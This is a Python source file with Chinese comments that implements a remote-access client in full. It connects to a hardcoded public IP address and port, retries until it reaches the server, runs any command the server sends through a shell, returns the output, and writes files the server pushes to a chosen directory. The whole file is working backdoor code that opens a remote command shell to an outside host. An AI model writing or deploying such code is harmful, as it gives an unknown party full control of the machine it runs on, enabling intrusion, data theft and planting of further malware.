import socket
import subprocess
import threading
import os
import time

# 默认保存路径
default_save_path = os.getcwd()
# 当前保存路径，初始时设置为默认路径
current_save_path = default_save_path

def receive_command(sock):
    global current_save_path
    while True:
        try:
            # 接收服务端发送的命令
            command = sock.recv(1024)
            if not command:
                break
            command = command.decode('utf-8', errors='ignore')  # 使用errors='ignore'忽略解码错误
            if command.lower() == 'exit':
                break
            elif command.lower().startswith('upload '):
                # 处理上传命令
                file_info = command[7:]
                file_path, file_size = file_info.split(' ')
                file_size = int(file_size)
                # 构建完整的文件路径，使用当前保存路径
                file_full_path = os.path.join(current_save_path, os.path.basename(file_path))
                with open(file_full_path, 'wb') as f:
                    while file_size > 0:
                        bytes_read = sock.recv(4096)
                        if not bytes_read:
                            break
                        f.write(bytes_read)
                        file_size -= len(bytes_read)
                print(f"File {file_full_path} received.")
            elif command.lower().startswith('set_save_path '):
                # 处理设置保存路径命令
                new_path = command[15:]
                if os.path.isdir(new_path):
                    current_save_path = new_path
                    print(f"Save path set to: {current_save_path}")
                else:
                    print("Invalid directory.")
            else:
                # 执行命令
                output = subprocess.check_output(command, shell=True)
                # 发送命令执行结果回服务端
                sock.send(output)
        except Exception as e:
            sock.send(str(e).encode('utf-8'))
    sock.close()

def connect_to_server():
    host = '222.187.238.119'  # 服务端公网IP
    port = 13818
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, port))
            print("连接到服务器")
            return client
        except Exception as e:
            print(f"Failed to connect to server: {e}. Retrying in 1 second...")
            time.sleep(1)

def main():
    client = connect_to_server()

    # 发送准备信号给服务端
    client.send('ready'.encode('utf-8'))

    # 启动一个线程来接收服务端发送的命令
    receive_thread = threading.Thread(target=receive_command, args=(client,))
    receive_thread.start()

    receive_thread.join()
    client.close()

if __name__ == '__main__':
    main()